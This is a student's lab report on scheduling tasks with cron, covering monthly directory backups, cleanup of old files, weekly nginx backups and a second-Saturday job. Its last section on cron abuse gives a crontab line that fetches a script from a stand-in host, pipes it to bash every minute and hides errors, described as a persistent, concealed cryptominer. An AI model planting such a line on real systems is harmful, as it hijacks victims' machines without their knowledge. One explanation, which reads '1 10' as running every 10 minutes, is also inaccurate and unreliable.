**Author: Sergey Razmakhov**
**Group: CBS-02**
**Lab 6: Scheduling Tasks**

### 1. directory backup & cleanup

![](../attachments/Pasted%20image%2020250304012022.png)

`0 0 5 * *` runs job at midnight on the 5th of every month.
The rest in the script.

![](../attachments/Pasted%20image%2020250304012415.png)

For cleanup:

![](../attachments/Pasted%20image%2020250304012541.png)

`1 10` allows to run script daily, every 10 minutes.
The rest in the script (the files older than 30 days will be deleted).

### 2. nginx backup

![](../attachments/Pasted%20image%2020250304102357.png)

`0 0 * * 0` runs job at midnight every Sunday.
Further details are in the script (I utilize `find` command to delete all deprecated backups).

### 3. job description

![](../attachments/Pasted%20image%2020250304105107.png)

There is no way to specify the job to run on the second Saturday of every month, so we forced to check all days within possible range. 
Further details are in the script.

### 4. cron jobs abuse

```bash
* * * * * curl -s http://hijack.com/bomb.sh | bash 2> /dev/null
```

Downloads cryptocurrency script, runs it and redirects all errors to `/dev/null` to ensure victim's unawareness. `* * * * *` allows to run miner persistently, even though some related processes might be killed.